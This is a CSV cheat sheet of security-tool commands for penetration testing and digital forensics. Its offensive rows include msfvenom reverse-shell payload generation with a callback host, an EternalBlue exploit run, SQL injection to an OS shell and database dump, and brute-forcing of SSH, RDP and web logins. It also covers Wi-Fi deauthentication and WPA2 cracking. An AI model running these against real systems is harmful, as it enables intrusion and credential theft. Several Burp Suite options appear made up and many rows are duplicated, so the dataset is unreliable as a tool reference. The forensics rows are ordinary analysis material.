tool,command,description,category,use_case,flags,os,reference_link,supported_languages
dirb,dirb http://example.com wordlist.txt,Brute-force directories and files on a web server.,Web Application,Directory enumeration,[],Linux,https://www.kali.org/tools/dirb/,
sqlmap,sqlmap -u http://example.com --tables,Enumerate tables in a database via SQL injection.,Web Application,SQL injection exploitation,"[""-u"",""--tables""]",Linux,http://sqlmap.org/,
hydra,hydra -L users.txt -P passwords.txt ssh://192.168.1.1,Brute-force SSH credentials using user and password lists.,Password Cracking,SSH brute-forcing,"[""-L"",""-P""]",Linux,https://www.kali.org/tools/hydra/,
metasploit,msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS 192.168.1.0/24; run',Scan for SMB versions on a network range.,Networking,Service enumeration,"[""-q"",""-x""]",Linux,https://docs.metasploit.com/,
aircrack-ng,airmon-ng start wlan0,Enable monitor mode on a wireless interface.,Wireless,Wireless packet capturing,"[""start""]",Linux,https://www.aircrack-ng.org/,
nmap,nmap --script http-enum 192.168.1.1,Enumerate web directories and files using Nmap scripts.,Web Application,Web enumeration,"[""--script""]",Linux,https://nmap.org/nsedoc/scripts/http-enum.html,
wpscan,wpscan --url http://example.com --enumerate u,Enumerate WordPress users.,Web Application,WordPress vulnerability scanning,"[""--url"",""--enumerate""]",Linux,https://wpscan.com/wordpress-security-scanner,
hydra,hydra -l admin -P passwords.txt http-post-form '/login:username=^USER^&password=^PASS^:Invalid',Brute-force HTTP form-based authentication.,Password Cracking,Web form brute-forcing,"[""-l"",""-P""]",Linux,https://www.kali.org/tools/hydra/,
msfvenom,msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe,Generate a reverse TCP Meterpreter payload for Windows.,Exploitation,Payload generation,"[""-p"",""-f"",""-o""]",Linux,https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html,
sqlmap,sqlmap -u http://example.com --data 'id=1' --level 3,Test for SQL injection with POST data and increased detection level.,Web Application,Advanced SQL injection testing,"[""-u"",""--data"",""--level""]",Linux,http://sqlmap.org/,
nmap,nmap -sU -p 1-1000 192.168.1.1,Scan UDP ports on a target host.,Networking,UDP port scanning,"[""-sU"",""-p""]",Linux,https://nmap.org/book/man-briefoptions.html,
metasploit,msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOST 192.168.1.10; run',Exploit Windows SMB using EternalBlue.,Exploitation,Remote code execution,"[""-q"",""-x""]",Linux,https://docs.metasploit.com/,
aircrack-ng,airodump-ng wlan0mon --bssid 00:11:22:33:44:55,Capture packets from a specific wireless access point.,Wireless,Wireless traffic analysis,"[""--bssid""]",Linux,https://www.aircrack-ng.org/,
hydra,hydra -l root -P passwords.txt rdp://192.168.1.1,Brute-force RDP credentials.,Password Cracking,RDP brute-forcing,"[""-l"",""-P""]",Linux,https://www.kali.org/tools/hydra/,
burpsuite,java -jar burpsuite.jar --proxy 127.0.0.1:8080,Start Burp Suite with a proxy listener.,Web Application,Web traffic interception,"[""--proxy""]",Linux,https://portswigger.net/burp/documentation,
wireshark,wireshark -i eth0 -k,Start Wireshark with immediate packet capture on eth0.,Networking,Real-time traffic analysis,"[""-i"",""-k""]",Linux,https://www.wireshark.org/docs/,
john,john --format=nt hash.txt,Crack NTLM hashes.,Password Cracking,NTLM hash cracking,"[""--format""]",Linux,https://www.openwall.com/john/,
hashcat,hashcat -m 1000 -a 3 hash.txt ?d?d?d?d,Brute-force NTLM hashes with a 4-digit mask.,Password Cracking,Mask-based hash cracking,"[""-m"",""-a""]",Linux,https://hashcat.net/hashcat/,
nikto,nikto -h https://example.com -ssl,Scan HTTPS server for vulnerabilities.,Web Application,Web server scanning,"[""-h"",""-ssl""]",Linux,https://cirt.net/Nikto2,
dirb,dirb http://example.com -r,Perform non-recursive directory brute-forcing.,Web Application,Directory enumeration,"[""-r""]",Linux,https://www.kali.org/tools/dirb/,
nmap,nmap -A 192.168.1.1,Perform aggressive scan with OS and service detection.,Networking,Comprehensive host discovery,"[""-A""]",Linux,https://nmap.org/book/man-briefoptions.html,
metasploit,msfconsole -q -x 'use auxiliary/scanner/http/dir_scanner; set RHOSTS 192.168.1.1; run',Scan for web directories using Metasploit.,Web Application,Web directory enumeration,"[""-q"",""-x""]",Linux,https://docs.metasploit.com/,
sqlmap,sqlmap -u http://example.com --os-shell,Attempt to gain an OS shell via SQL injection.,Web Application,SQL injection exploitation,"[""-u"",""--os-shell""]",Linux,http://sqlmap.org/,
hydra,hydra -l admin -P passwords.txt smtp://192.168.1.1,Brute-force SMTP credentials.,Password Cracking,SMTP brute-forcing,"[""-l"",""-P""]",Linux,https://www.kali.org/tools/hydra/,
aircrack-ng,aircrack-ng -a 2 -w wordlist.txt capture.cap,Crack WPA2 keys from captured packets.,Wireless,WPA2 key cracking,"[""-a"",""-w""]",Linux,https://www.aircrack-ng.org/,
wpscan,wpscan --url http://example.com --plugins-detection aggressive,Aggressively detect WordPress plugins.,Web Application,WordPress plugin scanning,"[""--url"",""--plugins-detection""]",Linux,https://wpscan.com/wordpress-security-scanner,
msfvenom,msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o payload.elf,Generate a reverse TCP Meterpreter payload for Linux.,Exploitation,Payload generation,"[""-p"",""-f"",""-o""]",Linux,https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html,
nmap,nmap --script vuln 192.168.1.1,Run vulnerability scanning scripts.,Networking,Vulnerability scanning,"[""--script""]",Linux,https://nmap.org/nsedoc/categories/vuln.html,
burpsuite,java -jar burpsuite.jar --spider http://example.com,Crawl a website using Burp Suite’s spider.,Web Application,Website crawling,"[""--spider""]",Linux,https://portswigger.net/burp/documentation,
wireshark,wireshark -r capture.pcap -Y 'http.request',Analyze HTTP requests in a saved capture file.,Networking,Packet analysis,"[""-r"",""-Y""]",Linux,https://www.wireshark.org/docs/,
john,john --format=sha512crypt hash.txt,Crack SHA-512 crypt hashes.,Password Cracking,Crypt hash cracking,"[""--format""]",Linux,https://www.openwall.com/john/,
hashcat,hashcat -m 1800 -a 0 hash.txt wordlist.txt,Crack SHA-512 crypt hashes using a wordlist.,Password Cracking,Crypt hash cracking,"[""-m"",""-a""]",Linux,https://hashcat.net/hashcat/,
nikto,nikto -h http://example.com -Tuning 4,Scan for specific web server vulnerabilities.,Web Application,Targeted vulnerability scanning,"[""-h"",""-Tuning""]",Linux,https://cirt.net/Nikto2,
dirb,dirb http://example.com -X .php,Brute-force PHP files on a web server.,Web Application,File extension enumeration,"[""-X""]",Linux,https://www.kali.org/tools/dirb/,
nmap,nmap -sC 192.168.1.1,Run default Nmap scripts for service detection.,Networking,Service enumeration,"[""-sC""]",Linux,https://nmap.org/book/man-briefoptions.html,
metasploit,msfconsole -q -x 'use auxiliary/scanner/ftp/ftp_version; set RHOSTS 192.168.1.0/24; run',Scan for FTP service versions.,Networking,FTP enumeration,"[""-q"",""-x""]",Linux,https://docs.metasploit.com/,
sqlmap,sqlmap -u http://example.com --batch --dump,Automate SQL injection and dump database contents.,Web Application,Database extraction,"[""-u"",""--batch"",""--dump""]",Linux,http://sqlmap.org/,
hydra,hydra -l admin -P passwords.txt telnet://192.168.1.1,Brute-force Telnet credentials.,Password Cracking,Telnet brute-forcing,"[""-l"",""-P""]",Linux,https://www.kali.org/tools/hydra/,
aircrack-ng,aireplay-ng --deauth 10 -a 00:11:22:33:44:55 wlan0mon,Send deauthentication packets to a wireless AP.,Wireless,Wireless deauthentication attack,"[""--deauth"",""-a""]",Linux,https://www.aircrack-ng.org/,
autopsy,autopsy -d /case1 -i /dev/sda,Start Autopsy to analyze a disk image for forensic evidence.,Forensics,Disk image analysis,"[""-d"",""-i""]",Linux,https://www.sleuthkit.org/autopsy/docs.php,
foremost,foremost -t all -i image.dd -o output/,Recover files from a disk image based on file types.,Forensics,File recovery,"[""-t"",""-i"",""-o""]",Linux,http://foremost.sourceforge.net/,
volatility,volatility -f memory.dump imageinfo,Identify memory image profile for further analysis.,Forensics,Memory forensics,"[""-f""]",Linux,https://www.volatilityfoundation.org/,
binwalk,binwalk -e firmware.bin,Extract embedded files and firmware components.,Forensics,Firmware analysis,"[""-e""]",Linux,https://github.com/ReFirmLabs/binwalk,
dd,dd if=/dev/sda of=image.dd bs=4M,Create a forensic disk image of a physical drive.,Forensics,Disk imaging,"[""if"",""of"",""bs""]",Linux,https://www.man7.org/linux/man-pages/man1/dd.1.html,
sleuthkit,tsk_recover -a image.dd output/,Recover deleted files from a disk image.,Forensics,File recovery,"[""-a""]",Linux,https://www.sleuthkit.org/sleuthkit/man/tsk_recover.html,
testdisk,testdisk /dev/sda,Recover lost partitions and repair filesystems.,Forensics,Partition recovery,[],Linux,https://www.cgsecurity.org/wiki/TestDisk,
photorec,photorec /dev/sda,Recover files from a disk based on file signatures.,Forensics,File recovery,[],Linux,https://www.cgsecurity.org/wiki/PhotoRec,
volatility,volatility -f memory.dump --profile=Win7SP1x64 pslist,List running processes from a memory dump.,Forensics,Memory forensics,"[""-f"",""--profile""]",Linux,https://www.volatilityfoundation.org/,
bulk_extractor,bulk_extractor -o output/ image.dd,Extract bulk data like emails and URLs from a disk image.,Forensics,Data extraction,"[""-o""]",Linux,https://github.com/simsong/bulk_extractor,
scalpel,scalpel -c scalpel.conf -o output/ image.dd,Carve files from a disk image using a configuration file.,Forensics,File carving,"[""-c"",""-o""]",Linux,https://github.com/sleuthkit/scalpel,
guymager,guymager -o /case1/image.dd /dev/sda,Acquire a forensic disk image with a GUI interface.,Forensics,Disk imaging,"[""-o""]",Linux,https://guymager.sourceforge.io/,
dcfldd,dcfldd if=/dev/sda of=image.dd hash=sha256,Create a disk image with hash verification.,Forensics,Disk imaging,"[""if"",""of"",""hash""]",Linux,http://dcfldd.sourceforge.net/,
exiftool,exiftool evidence.jpg,Extract metadata from an image file.,Forensics,Metadata analysis,[],Linux,https://exiftool.org/,
strings,strings memory.dump > strings.txt,Extract printable strings from a memory dump.,Forensics,Data extraction,[],Linux,https://www.man7.org/linux/man-pages/man1/strings.1.html,
volatility,volatility -f memory.dump --profile=Win7SP1x64 netscan,Analyze network connections in a memory dump.,Forensics,Network forensics,"[""-f"",""--profile""]",Linux,https://www.volatilityfoundation.org/,
sleuthkit,fls -r image.dd,List files and directories in a disk image.,Forensics,Filesystem analysis,"[""-r""]",Linux,https://www.sleuthkit.org/sleuthkit/man/fls.html,
binwalk,binwalk --signature firmware.bin,Analyze firmware for embedded signatures.,Forensics,Firmware analysis,"[""--signature""]",Linux,https://github.com/ReFirmLabs/binwalk,
foremost,foremost -t jpg -i image.dd -o output/,Recover JPEG files from a disk image.,Forensics,File recovery,"[""-t"",""-i"",""-o""]",Linux,http://foremost.sourceforge.net/,
autopsy,autopsy -p 8080,Start Autopsy web server for remote case analysis.,Forensics,Disk image analysis,"[""-p""]",Linux,https://www.sleuthkit.org/autopsy/docs.php,
ddrescue,ddrescue -f /dev/sda image.dd logfile,Recover data from a failing disk with error handling.,Forensics,Disk recovery,"[""-f""]",Linux,https://www.gnu.org/software/ddrescue/,
volatility,volatility -f memory.dump --profile=Win7SP1x64 cmdline,Display command-line arguments of processes in a memory dump.,Forensics,Memory forensics,"[""-f"",""--profile""]",Linux,https://www.volatilityfoundation.org/,
sleuthkit,mmls image.dd,Display partition table of a disk image.,Forensics,Partition analysis,[],Linux,https://www.sleuthkit.org/sleuthkit/man/mmls.html,
testdisk,testdisk /log /dev/sda,Recover partitions with logging enabled.,Forensics,Partition recovery,"[""/log""]",Linux,https://www.cgsecurity.org/wiki/TestDisk,
photorec,photorec /d output/ /dev/sda,Recover files to a specified output directory.,Forensics,File recovery,"[""/d""]",Linux,https://www.cgsecurity.org/wiki/PhotoRec,
bulk_extractor,bulk_extractor -E email -o output/ image.dd,Extract email addresses from a disk image.,Forensics,Data extraction,"[""-E"",""-o""]",Linux,https://github.com/simsong/bulk_extractor,
exiftool,exiftool -csv evidence.jpg > metadata.csv,Export image metadata to a CSV file.,Forensics,Metadata analysis,"[""-csv""]",Linux,https://exiftool.org/,
dcfldd,dcfldd if=/dev/sda of=image.dd hashlog=hash.txt,Create a disk image with a hash log.,Forensics,Disk imaging,"[""if"",""of"",""hashlog""]",Linux,http://dcfldd.sourceforge.net/,
guymager,guymager -c /case1/config.xml,Acquire a disk image using a configuration file.,Forensics,Disk imaging,"[""-c""]",Linux,https://guymager.sourceforge.io/,
sleuthkit,icat image.dd 12345 > file.txt,Extract a file by inode from a disk image.,Forensics,File extraction,[],Linux,https://www.sleuthkit.org/sleuthkit/man/icat.html,
volatility,volatility -f memory.dump --profile=Win7SP1x64 memdump -p 1234,Dump memory of a specific process.,Forensics,Memory forensics,"[""-f"",""--profile"",""-p""]",Linux,https://www.volatilityfoundation.org/,
binwalk,binwalk -M firmware.bin,Perform recursive analysis of firmware.,Forensics,Firmware analysis,"[""-M""]",Linux,https://github.com/ReFirmLabs/binwalk,
foremost,foremost -t pdf -i image.dd -o output/,Recover PDF files from a disk image.,Forensics,File recovery,"[""-t"",""-i"",""-o""]",Linux,http://foremost.sourceforge.net/,
ddrescue,ddrescue -r 3 /dev/sda image.dd logfile,Recover data with multiple retries.,Forensics,Disk recovery,"[""-r""]",Linux,https://www.gnu.org/software/ddrescue/,
sleuthkit,fsstat image.dd,Display filesystem details of a disk image.,Forensics,Filesystem analysis,[],Linux,https://www.sleuthkit.org/sleuthkit/man/fsstat.html,
autopsy,autopsy -c /case1/case.aut,Open an existing Autopsy case file.,Forensics,Disk image analysis,"[""-c""]",Linux,https://www.sleuthkit.org/autopsy/docs.php,
exiftool,exiftool -a -u evidence.pdf,"Extract all metadata, including unknown tags, from a PDF.",Forensics,Metadata analysis,"[""-a"",""-u""]",Linux,https://exiftool.org/,
volatility,volatility -f memory.dump --profile=Win7SP1x64 hivelist,List registry hives in a memory dump.,Forensics,Memory forensics,"[""-f"",""--profile""]",Linux,https://www.volatilityfoundation.org/,
bulk_extractor,bulk_extractor -E url -o output/ image.dd,Extract URLs from a disk image.,Forensics,Data extraction,"[""-E"",""-o""]",Linux,https://github.com/simsong/bulk_extractor,
scalpel,scalpel -b -o output/ image.dd,Carve files without headers from a disk image.,Forensics,File carving,"[""-b"",""-o""]",Linux,https://github.com/sleuthkit/scalpel,
testdisk,testdisk /dev/sda /analyse,Analyze disk for partition recovery.,Forensics,Partition recovery,"[""/analyse""]",Linux,https://www.cgsecurity.org/wiki/TestDisk,
photorec,photorec /log /d output/ /dev/sda,Recover files with logging enabled.,Forensics,File recovery,"[""/log"",""/d""]",Linux,https://www.cgsecurity.org/wiki/PhotoRec,
dcfldd,dcfldd if=/dev/sda of=image.dd status=on,Create a disk image with progress status.,Forensics,Disk imaging,"[""if"",""of"",""status""]",Linux,http://dcfldd.sourceforge.net/,
guymager,guymager -l logfile /dev/sda,Acquire a disk image with logging.,Forensics,Disk imaging,"[""-l""]",Linux,https://guymager.sourceforge.io/,
sleuthkit,blkls image.dd > slack_space.dat,Extract slack space from a disk image.,Forensics,Slack space analysis,[],Linux,https://www.sleuthkit.org/sleuthkit/man/blkls.html,
volatility,volatility -f memory.dump --profile=Win7SP1x64 filescan,Scan for file objects in a memory dump.,Forensics,Memory forensics,"[""-f"",""--profile""]",Linux,https://www.volatilityfoundation.org/,
binwalk,binwalk -y filesystem firmware.bin,Extract filesystem from firmware.,Forensics,Firmware analysis,"[""-y""]",Linux,https://github.com/ReFirmLabs/binwalk,
foremost,foremost -t docx -i image.dd -o output/,Recover DOCX files from a disk image.,Forensics,File recovery,"[""-t"",""-i"",""-o""]",Linux,http://foremost.sourceforge.net/,
ddrescue,ddrescue -n /dev/sda image.dd logfile,Recover data without retrying bad sectors.,Forensics,Disk recovery,"[""-n""]",Linux,https://www.gnu.org/software/ddrescue/,
exiftool,exiftool -json evidence.jpg > metadata.json,Export image metadata to a JSON file.,Forensics,Metadata analysis,"[""-json""]",Linux,https://exiftool.org/,
sqlmap,sqlmap -u http://example.com --dbs,Enumerate databases on a vulnerable web application.,Web Application,SQL injection testing,"[""-u"",""--dbs""]",Linux,http://sqlmap.org/,
sqlmap,sqlmap -u http://example.com --tables,Enumerate tables in a database via SQL injection.,Web Application,SQL injection exploitation,"[""-u"",""--tables""]",Linux,http://sqlmap.org/,
sqlmap,sqlmap -u http://example.com --data 'id=1' --level 3,Test for SQL injection with POST data and increased detection level.,Web Application,Advanced SQL injection testing,"[""-u"",""--data"",""--level""]",Linux,http://sqlmap.org/,
sqlmap,sqlmap -u http://example.com --os-shell,Attempt to gain an OS shell via SQL injection.,Web Application,SQL injection exploitation,"[""-u"",""--os-shell""]",Linux,http://sqlmap.org/,
sqlmap,sqlmap -u http://example.com --batch --dump,Automate SQL injection and dump database contents.,Web Application,Database extraction,"[""-u"",""--batch"",""--dump""]",Linux,http://sqlmap.org/,
burpsuite,java -jar burpsuite.jar,Launch Burp Suite for web vulnerability testing.,Web Application,Web application security testing,[],Linux,https://portswigger.net/burp/documentation,
burpsuite,java -jar burpsuite.jar --proxy 127.0.0.1:8080,Start Burp Suite with a proxy listener.,Web Application,Web traffic interception,"[""--proxy""]",Linux,https://portswigger.net/burp/documentation,
burpsuite,java -jar burpsuite.jar --spider http://example.com,Crawl a website using Burp Suite’s spider.,Web Application,Website crawling,"[""--spider""]",Linux,https://portswigger.net/burp/documentation,
nikto,nikto -h http://example.com,Scan web server for vulnerabilities and misconfigurations.,Web Application,Web server vulnerability scanning,"[""-h""]",Linux,https://cirt.net/Nikto2,
nikto,nikto -h https://example.com -ssl,Scan HTTPS server for vulnerabilities.,Web Application,Web server scanning,"[""-h"",""-ssl""]",Linux,https://cirt.net/Nikto2,
nikto,nikto -h http://example.com -Tuning 4,Scan for specific web server vulnerabilities.,Web Application,Targeted vulnerability scanning,"[""-h"",""-Tuning""]",Linux,https://cirt.net/Nikto2,
dirb,dirb http://example.com wordlist.txt,Brute-force directories and files on a web server.,Web Application,Directory enumeration,[],Linux,https://www.kali.org/tools/dirb/,
dirb,dirb http://example.com -r,Perform non-recursive directory brute-forcing.,Web Application,Directory enumeration,"[""-r""]",Linux,https://www.kali.org/tools/dirb/,
dirb,dirb http://example.com -X .php,Brute-force PHP files on a web server.,Web Application,File extension enumeration,"[""-X""]",Linux,https://www.kali.org/tools/dirb/,
wpscan,wpscan --url http://example.com --enumerate u,Enumerate WordPress users.,Web Application,WordPress vulnerability scanning,"[""--url"",""--enumerate""]",Linux,https://wpscan.com/wordpress-security-scanner,
wpscan,wpscan --url http://example.com --plugins-detection aggressive,Aggressively detect WordPress plugins.,Web Application,WordPress plugin scanning,"[""--url"",""--plugins-detection""]",Linux,https://wpscan.com/wordpress-security-scanner,
wpscan,wpscan --url http://example.com --api-token TOKEN,Scan WordPress site using an API token for enhanced features.,Web Application,WordPress vulnerability scanning,"[""--url"",""--api-token""]",Linux,https://wpscan.com/wordpress-security-scanner,
gobuster,gobuster dir -u http://example.com -w wordlist.txt,Brute-force directories on a web server.,Web Application,Directory enumeration,"[""dir"",""-u"",""-w""]",Linux,https://github.com/OJ/gobuster,
gobuster,gobuster vhost -u http://example.com -w subdomains.txt,Brute-force virtual hosts on a web server.,Web Application,Virtual host enumeration,"[""vhost"",""-u"",""-w""]",Linux,https://github.com/OJ/gobuster,
gobuster,gobuster dns -d example.com -w subdomains.txt,Enumerate subdomains using DNS brute-forcing.,Web Application,Subdomain enumeration,"[""dns"",""-d"",""-w""]",Linux,https://github.com/OJ/gobuster,
whatweb,whatweb http://example.com,Identify technologies used by a website.,Web Application,Web reconnaissance,[],Linux,https://www.morningstarsecurity.com/research/whatweb,
whatweb,whatweb -a 3 http://example.com,Perform aggressive scanning to identify website technologies.,Web Application,Web reconnaissance,"[""-a""]",Linux,https://www.morningstarsecurity.com/research/whatweb,
hydra,hydra -l admin -P passwords.txt http-post-form '/login:username=^USER^&password=^PASS^:Invalid',Brute-force HTTP form-based authentication.,Web Application,Web form brute-forcing,"[""-l"",""-P""]",Linux,https://www.kali.org/tools/hydra/,
hydra,hydra -L users.txt -P passwords.txt http-get http://example.com/login,Brute-force HTTP GET-based authentication.,Web Application,Web authentication brute-forcing,"[""-L"",""-P""]",Linux,https://www.kali.org/tools/hydra/,
sqlmap,sqlmap -u http://example.com --forms,Detect and exploit SQL injection in web forms.,Web Application,SQL injection testing,"[""-u"",""--forms""]",Linux,http://sqlmap.org/,
sqlmap,sqlmap -u http://example.com --crawl 2,Crawl a website to find SQL injection vulnerabilities.,Web Application,Web crawling for SQL injection,"[""-u"",""--crawl""]",Linux,http://sqlmap.org/,
burpsuite,java -jar burpsuite.jar --intruder http://example.com,Perform automated attacks using Burp Suite Intruder.,Web Application,Web vulnerability exploitation,"[""--intruder""]",Linux,https://portswigger.net/burp/documentation,
nikto,nikto -h http://example.com -C all,Perform comprehensive CGI scanning on a web server.,Web Application,Web server scanning,"[""-h"",""-C""]",Linux,https://cirt.net/Nikto2,
dirb,dirb http://example.com -o output.txt,Save directory brute-forcing results to a file.,Web Application,Directory enumeration,"[""-o""]",Linux,https://www.kali.org/tools/dirb/,
wpscan,wpscan --url http://example.com --enumerate t,Enumerate WordPress themes.,Web Application,WordPress theme scanning,"[""--url"",""--enumerate""]",Linux,https://wpscan.com/wordpress-security-scanner,
gobuster,"gobuster dir -u http://example.com -w wordlist.txt -x php,html",Brute-force directories with specific file extensions.,Web Application,Directory enumeration,"[""dir"",""-u"",""-w"",""-x""]",Linux,https://github.com/OJ/gobuster,
whatweb,whatweb --log-json=output.json http://example.com,Log website technology scan results to a JSON file.,Web Application,Web reconnaissance,"[""--log-json""]",Linux,https://www.morningstarsecurity.com/research/whatweb,
sqlmap,sqlmap -u http://example.com --risk 3,Test for SQL injection with high-risk techniques.,Web Application,Advanced SQL injection testing,"[""-u"",""--risk""]",Linux,http://sqlmap.org/,
burpsuite,java -jar burpsuite.jar --repeater http://example.com,Use Burp Suite Repeater to manually test HTTP requests.,Web Application,Manual request testing,"[""--repeater""]",Linux,https://portswigger.net/burp/documentation,
nikto,nikto -h http://example.com -output report.xml,Save web server scan results to an XML file.,Web Application,Web server scanning,"[""-h"",""-output""]",Linux,https://cirt.net/Nikto2,
dirb,dirb http://example.com -z 100,Brute-force directories with a 100ms delay between requests.,Web Application,Directory enumeration,"[""-z""]",Linux,https://www.kali.org/tools/dirb/,
wpscan,wpscan --url http://example.com --passwords passwords.txt,Brute-force WordPress login credentials.,Web Application,WordPress brute-forcing,"[""--url"",""--passwords""]",Linux,https://wpscan.com/wordpress-security-scanner,
gobuster,gobuster dir -u http://example.com -w wordlist.txt -t 50,Brute-force directories with 50 concurrent threads.,Web Application,Directory enumeration,"[""dir"",""-u"",""-w"",""-t""]",Linux,https://github.com/OJ/gobuster,
hydra,hydra -l admin -P passwords.txt http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^:Invalid',Brute-force WordPress login form.,Web Application,WordPress brute-forcing,"[""-l"",""-P""]",Linux,https://www.kali.org/tools/hydra/,
sqlmap,sqlmap -u http://example.com --tamper=space2comment,Use tamper scripts to bypass SQL injection filters.,Web Application,SQL injection filter evasion,"[""-u"",""--tamper""]",Linux,http://sqlmap.org/,
burpsuite,java -jar burpsuite.jar --scanner http://example.com,Perform automated vulnerability scanning with Burp Suite.,Web Application,Web vulnerability scanning,"[""--scanner""]",Linux,https://portswigger.net/burp/documentation,
nikto,nikto -h http://example.com -Plugins @ALL,Run all available Nikto plugins for scanning.,Web Application,Comprehensive web scanning,"[""-h"",""-Plugins""]",Linux,https://cirt.net/Nikto2,
dirb,dirb http://example.com -u user:pass,Brute-force directories with HTTP authentication.,Web Application,Directory enumeration,"[""-u""]",Linux,https://www.kali.org/tools/dirb/,
wpscan,wpscan --url http://example.com --enumerate ap,Enumerate all WordPress plugins.,Web Application,WordPress plugin scanning,"[""--url"",""--enumerate""]",Linux,https://wpscan.com/wordpress-security-scanner,
gobuster,gobuster dir -u http://example.com -w wordlist.txt -b 404,Brute-force directories and ignore 404 responses.,Web Application,Directory enumeration,"[""dir"",""-u"",""-w"",""-b""]",Linux,https://github.com/OJ/gobuster,
whatweb,whatweb -v http://example.com,Perform verbose scanning of website technologies.,Web Application,Web reconnaissance,"[""-v""]",Linux,https://www.morningstarsecurity.com/research/whatweb,
sqlmap,sqlmap -u http://example.com --cookie 'session=123',Test for SQL injection with a specified cookie.,Web Application,SQL injection testing,"[""-u"",""--cookie""]",Linux,http://sqlmap.org/,
burpsuite,java -jar burpsuite.jar --compare http://example.com,Compare two HTTP responses using Burp Suite.,Web Application,Response comparison,"[""--compare""]",Linux,https://portswigger.net/burp/documentation,
nikto,nikto -h http://example.com -Format csv,Save web server scan results to a CSV file.,Web Application,Web server scanning,"[""-h"",""-Format""]",Linux,https://cirt.net/Nikto2,
dirb,dirb http://example.com -S,Silently brute-force directories without verbose output.,Web Application,Directory enumeration,"[""-S""]",Linux,https://www.kali.org/tools/dirb/,
wpscan,wpscan --url http://example.com --disable-tls-checks,Scan WordPress site without TLS certificate validation.,Web Application,WordPress vulnerability scanning,"[""--url"",""--disable-tls-checks""]",Linux,https://wpscan.com/wordpress-security-scanner,
gobuster,gobuster dir -u http://example.com -w wordlist.txt -k,Brute-force directories and ignore SSL verification.,Web Application,Directory enumeration,"[""dir"",""-u"",""-w"",""-k""]",Linux,https://github.com/OJ/gobuster,
hydra,hydra -l admin -P passwords.txt http-get-form '/login:username=^USER^&password=^PASS^:Invalid',Brute-force HTTP GET form-based authentication.,Web Application,Web form brute-forcing,"[""-l"",""-P""]",Linux,https://www.kali.org/tools/hydra/,
